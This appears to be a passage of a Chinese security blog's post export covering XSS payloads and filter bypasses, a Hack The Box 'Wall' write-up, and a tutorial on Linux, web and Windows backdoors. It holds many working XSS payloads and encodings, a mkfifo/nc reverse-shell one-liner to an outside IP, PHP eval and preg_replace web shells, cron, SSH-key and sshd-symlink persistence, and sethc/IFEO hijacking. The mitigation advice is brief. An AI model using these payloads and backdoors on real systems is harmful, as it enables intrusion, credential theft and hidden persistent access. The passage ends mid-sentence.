Scripting）攻击，即跨站脚本攻击，指恶意攻击者在web页面中插入恶意script代码，当用户浏览该页面时，加载并执行嵌入web页面中的script代码，从而达到恶意攻击用户的目的。</p><p><strong>漏洞危害</strong><br>&ensp;&ensp;&ensp;&ensp;恶意攻击者可能利用该漏洞来窃取用户的cookie、账号等用户数据，控制应用系统数据，在网站挂马，控制受害服务器向其他网站发起恶意请求等等。</p><p><strong>漏洞修复</strong><br>针对跨站点脚本编制，提供以下修复建议：<br>1、使用html实体编码功能对所有输出进行实体编码。<br>2、对输入输出进行验证，最好可以使用白名单验证，建议使用正则表达式进行合法性判断。<br>3、如果无法使用白名单验证，则使用黑名单进行过滤：<br>&ensp;&ensp;&ensp;&ensp;对特殊字符进行HTML实体编码，包括单引号（’）、双引号（”）、尖括号（&lt;&gt;）、反斜杠（\）、冒号（:）、与字符（&amp;）、#号（#）等；<br>&ensp;&ensp;&ensp;&ensp;过滤Javascript关键字，如alert、script、javascript、cookie、prompt等，包括这些字符的大小写（如ScRiPt）、URL编码、Unicode编码、Hex编码等编码；<br>&ensp;&ensp;&ensp;&ensp;过滤HTML标签和事件，如img、iframe、onclick、onfocus、href、onload、onerror、mouseover等，包括这些字符的大小写（如OncLiCk）、URL编码、Unicode编码、Hex编码等编码。<br>4、设置会话Cookie的属性为HttpOnly，防止会话Cookie被恶意脚本窃取。</p><hr><h2 id="0x01-简单脚本"><a href="#0x01-简单脚本" class="headerlink" title="0x01 简单脚本"></a>0x01 简单脚本</h2><p><strong>test.php</strong></p><pre><code>&lt;?php$xss=$_GET[&#39;xss&#39;];echo $xss;</code></pre><p><strong>test.html</strong></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;!--script type=&quot;text/javascript&quot;&gt;alert(1)&lt;/script--&gt;  &lt;!--弹窗--&gt;    &lt;!--script type=&quot;text/javascript&quot;&gt;alert&amp;#40;2)&lt;/script--&gt; &lt;!--不弹窗--&gt;    &lt;!--svg&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert&amp;#40;3)&lt;/script--&gt; &lt;!--弹窗--&gt;    &lt;!--a href=&quot;javascript:alert(1)&quot;&gt;XSS&lt;/a--&gt; &lt;!--弹窗--&gt;    &lt;!--a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;XSS&lt;/a--&gt; &lt;!--弹窗--&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><hr><h2 id="0x02-常用"><a href="#0x02-常用" class="headerlink" title="0x02 常用"></a>0x02 常用</h2><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert`1`&lt;/script&gt;&lt;svg/onload=alert(1)&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;img src=1 onerror=eval(&quot;alert(1)&quot;)&gt;&lt;plaintext/onmouseover=prompt(1)&gt;&lt;a onmouseover=alert(1)&gt;1&lt;/a&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;a href=&quot;javascript:asd&quot; onmouseover=&quot;alert(1)&quot;&gt;&lt;script&gt;console.log(&#39;1&#39;)&lt;/script&gt;&lt;script&gt;eval(&#39;al&#39;+&#39;ert&#39;(1))&lt;/script&gt;</code></pre><hr><h2 id="常用同作用的关键字"><a href="#常用同作用的关键字" class="headerlink" title="常用同作用的关键字"></a>常用同作用的关键字</h2><p><strong>对话框</strong></p><ol><li>alert()</li><li>confirm()</li><li>prompt()</li></ol><p><strong><a href="https://www.runoob.com/tags/html-reference.html" target="_blank" rel="noopener">对象</a></strong></p><ol><li><code>&lt;a&gt;&lt;/a&gt;</code></li><li><code>&lt;body&gt;&lt;/body&gt;</code></li><li><code>&lt;iframe&gt;&lt;/iframe&gt;</code></li><li><code>&lt;img src=1 onerror=alert()&gt;</code></li><li><code>&lt;input&gt;</code></li><li><code>&lt;script&gt;&lt;/script&gt;</code></li><li><code>&lt;style&gt;&lt;/style&gt;</code></li><li><code>&lt;svg&gt;</code></li></ol><p><strong>事件</strong></p><ol><li>onerror()</li><li>onclick()</li><li>onmouseover()</li><li>onload()</li></ol><ol><li>使用 window.alert() 写入警告框</li><li>使用 document.write() 写入 HTML 输出</li><li>使用 innerHTML 写入 HTML 元素</li><li>使用 console.log() 写入浏览器控制台</li></ol><hr><h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><pre><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><pre><code>&lt;scRIpt&gt;ALert(1)&lt;/SCriPt&gt;</code></pre><h3 id="多标签绕过"><a href="#多标签绕过" class="headerlink" title="多标签绕过"></a>多标签绕过</h3><pre><code>&lt;script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/script&gt;&lt;asd&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;/asd&gt;</code></pre><h3 id="插入空字符"><a href="#插入空字符" class="headerlink" title="插入空字符"></a>插入空字符</h3><pre><code>&lt;SCR%00IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</code></pre><h3 id="拼接、拆分"><a href="#拼接、拆分" class="headerlink" title="拼接、拆分"></a>拼接、拆分</h3><pre><code>&lt;script&gt;evel(&#39;al&#39;+&#39;ert&#39;(1))&lt;script&gt;</code></pre><h3 id="替换字符"><a href="#替换字符" class="headerlink" title="替换字符"></a>替换字符</h3><pre><code>&lt;img/src=1/**/onload=alert(1)&gt; #/**/替换空格&lt;svg/onload=(confirm)()&gt;</code></pre><h3 id="各种编码与部分编码"><a href="#各种编码与部分编码" class="headerlink" title="各种编码与部分编码"></a>各种编码与部分编码</h3><pre><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;XSS&lt;/a&gt; //URL编码:URL编码&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%31%29&quot;&gt;XSS&lt;/a&gt; //HTML字符实体编码:URL编码&lt;button onclick=&quot;confirm(&#39;7&amp;#39;);&quot;&gt;Button&lt;/button&gt; //HTML字符实体编码&lt;button onclick=&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;/button&gt; //unicode编码%2BADw-script%2BAD4-alert%281%29%2BADw-/script%2BAD4- #UTF-7编码&lt;script&gt;a\u006cert(1);&lt;/script&gt; #部分jsunicode编码&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt; #base64编码</code></pre><p><strong>javascript:alert(1)</strong></p><pre><code>\u0061\u006c\u0065\u0072\u0074 //alert：[中文转Unicode](http://www.jsons.cn/unicode/)%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34 //\u0061\u006c\u0065\u0072\u0074：[全字符URL编码](http://www.jsons.cn/urlencode/)&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x29; //javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1): [HTML实体](https://www.qqxiuzi.cn/bianma/zifushiti.php)&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0025;&amp;#x0035;&amp;#x0063;&amp;#x0025;&amp;#x0037;&amp;#x0035;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0036;&amp;#x0025;&amp;#x0033;&amp;#x0031;&amp;#x0025;&amp;#x0035;&amp;#x0063;&amp;#x0025;&amp;#x0037;&amp;#x0035;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0036;&amp;#x0025;&amp;#x0036;&amp;#x0033;&amp;#x0025;&amp;#x0035;&amp;#x0063;&amp;#x0025;&amp;#x0037;&amp;#x0035;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0036;&amp;#x0025;&amp;#x0033;&amp;#x0035;&amp;#x0025;&amp;#x0035;&amp;#x0063;&amp;#x0025;&amp;#x0037;&amp;#x0035;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0037;&amp;#x0025;&amp;#x0033;&amp;#x0032;&amp;#x0025;&amp;#x0035;&amp;#x0063;&amp;#x0025;&amp;#x0037;&amp;#x0035;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0030;&amp;#x0025;&amp;#x0033;&amp;#x0037;&amp;#x0025;&amp;#x0033;&amp;#x0034;&amp;#x0028;&amp;#x0031;&amp;#x0029; //javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)：[中文转&amp;#XXXX](http://www.jsons.cn/unicode/)</code></pre><p><strong>URL编码</strong></p><ol><li>尖括号&lt;：%3c</li></ol><p><strong>Unicode编码</strong></p><ol><li>尖括号&lt;：&#60; \u0026\u006c\u0074\u003b（&lt;）</li></ol><p><strong>html字符实体编码</strong></p><ol><li>尖括号&lt;：html十进制：&#60; html十六进制：&#x3c;</li></ol><p><strong>javascript的八进制与十六进制</strong></p><ol><li>尖括号&lt;：js八进制：\74 js十六进制：\x3c、\3c</li></ol><p><strong>native编码 jsunicode编码</strong></p><ol><li>尖括号&lt;：\u003c</li></ol><p><strong>HEX编码</strong></p><ol><li>尖括号&lt;：%26%6c%74%3b</li></ol><p><strong>base64编码</strong></p><ol><li>尖括号&lt;：PA==</li></ol><p><strong>String.fromCharCode编码</strong></p><ol><li>alert：String.fromCharCode(97,108,101,114,116)</li></ol><h2 id="DOM-XSS绕过"><a href="#DOM-XSS绕过" class="headerlink" title="DOM XSS绕过"></a>DOM XSS绕过</h2><p><strong>index.php</strong></p><pre><code>&lt;?php /* File: index.php */// CSP disabled for now, will enable later// header(&quot;Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-eval&#39;; object-src &#39;none&#39;;&quot;);?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;body&gt;   &lt;div id=&quot;app&quot;&gt;  &lt;/div&gt;  &lt;script src=&quot;http://127.0.0.1:8000/main.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>main.js</strong></p><pre><code>/** FILE: main.js **/var ref=document.location.href.split(&quot;?injectme=&quot;)[1];document.getElementById(&quot;app&quot;).innerHTML = decodeURIComponent(ref);</code></pre><ol><li>访问<code>http://127.0.0.1/index.php?injectme=&lt;img src=1 onerror=&quot;alert(&#39;XSS&#39;)&quot;/&gt;</code> #该页面存在DOM XSS，main.js通过GET获取参数injectme的值</li><li><img src="/XSS/1.png" alt></li><li>去掉index.php中的第四行注释，启用安全策略（CSP）。</li></ol><p><strong>CSP</strong></p><ol><li><p>只允许同一主机的javascript</p></li><li><p>阻止不安全的函数，如eval()</p></li><li><p>阻止所有其他脚本</p></li><li><p>阻止所有对象（如flash）</p></li><li><p>再访问<code>http://127.0.0.1/index.php?injectme=&lt;img src=1 onerror=&quot;alert(&#39;XSS&#39;)&quot;/&gt;</code>，被拦截了</p></li><li><p><img src="/XSS/2.png" alt></p></li></ol><p><strong>简单绕过：</strong><br><strong>新main.js</strong></p><pre><code>/** FILE: main.js **/var ref = document.location.href.split(&quot;?injectme=&quot;)[1];document.getElementById(&quot;app&quot;).innerHTML = decodeURIComponent(ref);document.addEventListener(&quot;DOMContentLoaded&quot;, function() {             var expression = document.getElementById(&quot;expression&quot;).getAttribute(&quot;data&quot;);    var parsed = eval(expression);    document.getElementById(&quot;result&quot;).innerHTML = &#39;&lt;p&gt;&#39;+parsed+&#39;&lt;/p&gt;&#39;;});</code></pre><ol><li>通过滥用数学计算器代码来评估并执行javascript，而不违反CSP。只需要注入一个ID为“ expression”和一个名为“ data”的属性的HTML元素。内部数据将传递给eval。</li><li>再访问<code>http://127.0.0.1/index.php?injectme=&lt;div id=&quot;expression&quot; data=&quot;alert(&#39;XSS&#39;);&quot;/&gt;</code></li><li><img src="/XSS/3.png" alt></li></ol><p><strong>另一个例子</strong><br><strong>index.php</strong></p><pre><code>&lt;?php /** FILE: index.php **/header(&quot;Content-Security-Policy: script-src &#39;self&#39; https://code.jquery.com:443 &#39;unsafe-eval&#39;; object-src &#39;none&#39;;&quot;);?&gt;​&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;body&gt;  &lt;p id=&quot;app&quot;&gt;&lt;/p&gt;  &lt;script src=&quot;http://127.0.0.1/main.js&quot;&gt;&lt;/script&gt;  &lt;script src=&quot;https://code.jquery.com/jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt;  &lt;script src=&quot;https://code.jquery.com/mobile/1.2.1/jquery.mobile-1.2.1.min.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>main.js</strong></p><pre><code>/** FILE: main.js **/var ref = document.location.href.split(&quot;?injectme=&quot;)[1];document.getElementById(&quot;app&quot;).innerHTML = decodeURIComponent(ref);</code></pre><ol><li>访问<code>http://127.0.0.1/index.php?injectme=&lt;div data-role=popup id=&#39;hello world&#39;&gt;&lt;/div&gt;</code></li><li><img src="/XSS/4.png" alt></li><li>利用html注入</li><li>访问<code>http://127.0.0.1/index.php?injectme=&lt;div data-role=popup id=&#39;--!&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;&gt;&lt;/div&gt;</code></li><li><img src="/XSS/5.png" alt></li></ol><h2 id="0xF0-在线编码解码"><a href="#0xF0-在线编码解码" class="headerlink" title="0xF0 在线编码解码"></a>0xF0 在线编码解码</h2><ol><li><a href="https://www.qqxiuzi.cn/daohang.htm" target="_blank" rel="noopener">https://www.qqxiuzi.cn/daohang.htm</a></li><li><a href="http://www.jsons.cn/" target="_blank" rel="noopener">http://www.jsons.cn/</a></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> xss </tag>
            
            <tag> DOM </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Wall</title>
      <link href="/HTB-Wall/"/>
      <url>/HTB-Wall/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-有样学样"><a href="#0x00-有样学样" class="headerlink" title="0x00 有样学样"></a>0x00 有样学样</h2><ol><li>nmap扫描</li><li><img src="/HTB-Wall/1.png" alt></li><li>dirsearch目录扫描</li><li><img src="/HTB-Wall/2.png" alt></li><li>依次访问，<a href="http://10.10.10.157/monitoring/要登录" target="_blank" rel="noopener">http://10.10.10.157/monitoring/要登录</a></li><li><img src="/HTB-Wall/3.png" alt></li><li>爆破，没爆出来~</li><li>ssh爆破，账号admin,也没爆出来~</li><li>抓包看看</li><li><img src="/HTB-Wall/4.png" alt></li><li>换POST请求，响应200</li><li><img src="/HTB-Wall/5.png" alt></li><li>重定向到<a href="http://10.10.10.157/centreon/" target="_blank" rel="noopener">http://10.10.10.157/centreon/</a></li><li><img src="/HTB-Wall/6.png" alt></li><li>再扫目录</li><li><img src="/HTB-Wall/7.png" alt></li><li>一个后台登陆（centreon是开源的IT监控软件），登录，burpsuite爆破，不清楚账号密码，刚从<a href="http://10.10.10.157/monitoring/知道admin，默认账号为admin，爆出密码为password1" target="_blank" rel="noopener">http://10.10.10.157/monitoring/知道admin，默认账号为admin，爆出密码为password1</a></li><li><img src="/HTB-Wall/8.png" alt></li><li>查看版本</li><li><img src="/HTB-Wall/9.png" alt></li><li>搜索利用脚本</li><li><img src="/HTB-Wall/10.png" alt></li><li>利用脚本</li><li><img src="/HTB-Wall/11.png" alt></li><li>但等不到shell，查看脚本</li><li><img src="/HTB-Wall/12.png" alt></li><li>关键内容</li><li><img src="/HTB-Wall/13.png" alt></li><li>访问/main.get.php?p=60901，有一条配置，点击查看</li><li><img src="/HTB-Wall/14.png" alt></li><li>修改配置，让其命令执行</li><li><img src="/HTB-Wall/15.png" alt></li><li>保存即回显403</li><li><img src="/HTB-Wall/16.png" alt></li><li>添加${IFS}替换空格，保存没显示403</li><li><img src="/HTB-Wall/17.png" alt></li><li>修改利用脚本</li><li><img src="/HTB-Wall/18.png" alt></li><li>htb的内容</li><li>rm -f /tmp/t;mkfifo /tmp/t;cat /tmp/t|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.19 8888 &gt;/tmp/t</li><li>成功反弹shell</li><li><img src="/HTB-Wall/19.png" alt></li><li><img src="/HTB-Wall/20.png" alt></li><li>读user.txt，没权限</li><li><img src="/HTB-Wall/21.png" alt></li><li>搜索了suid二进制文件，发现screen-4.5.0，搜索screen相关利用脚本</li><li><img src="/HTB-Wall/27.png" alt></li><li>查看脚本，下载脚本，赋权，利用，失败~</li><li><img src="/HTB-Wall/28.png" alt></li><li>自主创建脚本文件libhax.c</li><li><img src="/HTB-Wall/22.png" alt></li><li>rootshell.c</li><li><img src="/HTB-Wall/23.png" alt></li><li>编译</li><li><img src="/HTB-Wall/24.png" alt></li><li>服务器下载文件</li><li><img src="/HTB-Wall/25.png" alt></li><li>使用screen提权</li><li><img src="/HTB-Wall/26.png" alt></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><p><a href="https://0xrick.github.io/hack-the-box/wall/" target="_blank" rel="noopener">https://0xrick.github.io/hack-the-box/wall/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各端口服务漏洞</title>
      <link href="/%E5%90%84%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/"/>
      <url>/%E5%90%84%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="端口漏洞"><a href="#端口漏洞" class="headerlink" title="端口漏洞"></a>端口漏洞</h2><p><img src="/%E5%90%84%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/1.png" alt><br><a href="/各端口服务漏洞/端口漏洞.xlsx">端口漏洞.xlsx</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>backdoors</title>
      <link href="/backdoors/"/>
      <url>/backdoors/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><ol><li>backdoor，后门。</li><li>从终端角度：IOT型，Linux型，windows型等</li><li>从Linux角度：配置型，logger型，rookit型等</li><li>从windows角度：registry型，schtasks型，WMI型等</li><li>从通信角度：irc型，dns型，icmp型，http/https型等</li><li>从网站应用角度：网站语言型，模块扩展型，配置文件型等</li></ol><h2 id="0x01-Linux后门批量kill"><a href="#0x01-Linux后门批量kill" class="headerlink" title="0x01 Linux后门批量kill"></a>0x01 Linux后门批量kill</h2><ol><li>ps -ef | grep “keyword” |awk ‘{print $2}’ |xargs kill -9 #-e：所有进程，-f：完整格式，grep：匹配相关关键字，awk：过滤出pid，xargs：将管道数据转换为命令参数，总：kill相关关键字的进程</li><li>例子：</li><li>ps -ef | grep “python” |awk ‘{print $2}’ |xargs kill -9</li><li>ps -ef | grep “bash -i” |awk ‘{print $2}’ |xargs kill -9</li></ol><h2 id="0x10-Linux-backdoors"><a href="#0x10-Linux-backdoors" class="headerlink" title="0x10 Linux_backdoors"></a>0x10 Linux_backdoors</h2><h3 id="crontab后门"><a href="#crontab后门" class="headerlink" title="crontab后门"></a>crontab后门</h3><ol><li>crontab文件的格式：</li><li><img src="/backdoors/8.png" alt></li><li>0 0 * * * /root/backdoor.sh #每天00:00执行一次backdoor.sh任务</li><li>00 12 * * 1,2,3,4,5 /root/backdoor.sh #周一至周五，12时00分执行一次任务</li><li>00 12 * * 1-5 /root/backdoor.sh #周一至周五，12时00分执行一次任务</li><li>*/10 * * * * /root/backdoor.sh #每10分钟执行一次任务</li><li>30 12 1 * * /root/backdoor.sh #每个月一号12时30分执行一次任务</li><li>crontab -e #修改crontab文件，无就新建</li><li>crontab -l #列出crontab文件</li><li><img src="/backdoors/11.png" alt></li><li>crontab -r #删除crontab文件</li><li><strong>类似的文件或目录：</strong></li><li>crontab，cron.d，cron.daily，cron.hourly，cron.monthly，cron.weekly</li><li><strong>例子:</strong></li><li>crontab -e #查看crontab文件，空白即无，新建</li><li><img src="/backdoors/9.png" alt></li><li>backdoor的内容</li><li><img src="/backdoors/10.png" alt></li><li>service crond restart #重启服务，然后等2分钟，shell就反连过来。</li><li><img src="/backdoors/12.png" alt></li></ol><h3 id="ssh公钥免密"><a href="#ssh公钥免密" class="headerlink" title="ssh公钥免密"></a>ssh公钥免密</h3><ol><li>本地主机生成的ssh公钥写到控制的服务器的~/.ssh/authorized_keys中，然后利用私钥完成认证登录。</li><li>本地生成公钥与私钥，上传公钥到服务器</li><li><img src="/backdoors/13.png" alt></li><li><img src="/backdoors/14.png" alt></li><li>修改ssh配置文件，保存，重启服务</li><li><img src="/backdoors/15.png" alt></li><li>systemctl restart sshd 或者 service sshd restart</li><li><strong>Linux私钥登录ssh</strong></li><li><img src="/backdoors/16.png" alt></li></ol><h3 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h3><ol><li>服务器建立软连接</li><li>ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oport=12345</li><li>ssh root:qweasd@IP -p 12345</li></ol><h2 id="web-backdoors"><a href="#web-backdoors" class="headerlink" title="web_backdoors"></a>web_backdoors</h2><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><ol><li>例子：网站目录下保留php木马文件</li><li><?php @eval($_POST['!Qa2Ws#']);?> </li><li></li><li>使用网站的文件包含漏洞，或者创建文件包含漏洞：</li><li>test.php：<?php include "test1.txt"?></li><li>test1.txt：<?php phpinfo();?> #代码随意</li><li><img src="/backdoors/1.png" alt></li><li>包含任意文件：</li><li>&lt;?php </li><li>if(isset($_GET[file])){</li><li>include($_GET[‘file’]);</li><li>}</li><li>?&gt;</li><li><img src="/backdoors/2.png" alt></li></ol><h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><ol><li>copy 1.png/b+shell.php test.png</li><li><img src="/backdoors/3.png" alt></li><li><img src="/backdoors/4.png" alt></li><li>通过文件包含漏洞</li><li><img src="/backdoors/5.png" alt></li></ol><h3 id="隐藏木马"><a href="#隐藏木马" class="headerlink" title="隐藏木马"></a>隐藏木马</h3><ol><li>preg_replace()函数</li><li><img src="/backdoors/6.png" alt></li><li>/e 修正符使preg_replace()将replacement参数当作PHP代码</li><li>&lt;?php</li><li>@preg_replace(“/Access/e”,$_GET[“pass”],”Access denied”);</li><li>?&gt;</li><li><img src="/backdoors/7.png" alt></li><li></li></ol><h3 id="对木马文件加密处理"><a href="#对木马文件加密处理" class="headerlink" title="对木马文件加密处理"></a>对木马文件加密处理</h3><h3 id="对木马文件变异加密处理"><a href="#对木马文件变异加密处理" class="headerlink" title="对木马文件变异加密处理"></a>对木马文件变异加密处理</h3><h2 id="0x-windows-backdoors"><a href="#0x-windows-backdoors" class="headerlink" title="0x windows_backdoors"></a>0x windows_backdoors</h2><h3 id="辅助功能映像劫持"><a href="#辅助功能映像劫持" class="headerlink" title="辅助功能映像劫持"></a>辅助功能映像劫持</h3><ol><li><a href="https://support.microsoft.com/zh-cn/help/13810/windows-keyboard-shortcuts-accessibility" target="_blank" rel="noopener">windows辅助功能</a>：为了易于访问与使用，添加一些辅助功能，在登录之前以结合键启动。</li><li>粘滞键（C:\Windows\System32\sethc.exe）：按5次shift</li><li>设置中心（C:\Windows\System32\utilman.exe）：windows+U</li><li><img src="/backdoors/22.png" alt></li><li>低版本的windows可以直接把sethc.exe替换成后门程序，windows Vista或windows server 2008及以上版本的会受到系统的保护。</li><li>映像劫持（Image File Execution Options）：当目标程序被映像劫持时，双击目标程序，系统会转而运行劫持程序，并不会运行目标程序。许多病毒会利用这一点来抑制杀毒软件的运行，并运行自己的程序。</li><li><strong>简单操作</strong></li><li>把C:\Windows\System32\cmd.exe重命名为C:\Windows\System32\sethc.exe（需要管理员权限）</li><li><img src="/backdoors/23.png" alt></li><li>锁屏状态下按5次shift</li><li><img src="/backdoors/24.png" alt></li><li>修改注册表：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</li><li>如sethc.exe，无就添加新项，新建字符串值，名称为Debugger，数据值为C:\Windows\System32\cmd.exe</li><li><img src="/backdoors/25.png" alt></li><li><img src="/backdoors/24.png" alt></li></ol><p><strong>映像劫持防御</strong></p><ol><li>检查注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\下的程序名称以及数据与值。</li><li>设置权限，取消administrator和system等的写权限。</li><li>或者直接把HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\的Image File Execution Options删除。</li></ol><h2 id="0xFD-phpstudy后门"><a href="#0xFD-phpstudy后门" class="headerlink" title="0xFD phpstudy后门"></a>0xFD phpstudy后门</h2><ol><li>测试代码：echo “phpstudy_backdoor!”; 